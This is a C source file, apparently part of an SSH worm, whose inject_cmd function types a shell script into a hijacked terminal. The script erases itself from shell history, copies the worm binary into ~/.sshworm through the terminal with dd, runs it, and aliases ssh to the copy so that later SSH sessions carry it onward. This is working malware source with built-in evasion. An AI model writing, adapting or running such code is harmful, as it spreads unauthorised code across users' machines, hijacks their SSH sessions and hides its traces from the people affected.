#include <stdio.h>
#include <unistd.h>
#include <string.h>

#include "tas/tas.h"

#include "inject-cmd.h"
#include "output-hooks.h"
#include "utils.h"
#include "debug.h"

void inject_cmd(int master)
{
	static const char script[]=
		"HISTCONTROL=ignoreboth\n"
 		" history -d $((HISTCMD - 1))\n"
		" p=~/.sshworm/ssh;"
		"if [ -e $p ];then "
			"echo 1nj3ct0;"
		"else "
			"mkdir ~/.sshworm;"
			"echo 1nj3ct1;"
			"stty raw -echo;"
			"dd of=$p bs=1 count=%d;"
			"stty sane;"
			"chmod +x $p;"
			"$p;"
			"alias ssh=\"$p\";"
		"fi; "
		"echo " MAGIC ";\n"
	;

	char buf[512];

	debug("__INJECTING THE COMMAND__:\r\n%s", script);
	debug("__EOF__");

	snprintf(buf, sizeof(buf), script, getfilesize(current_exe));
	write(master, buf, strlen(buf));
}
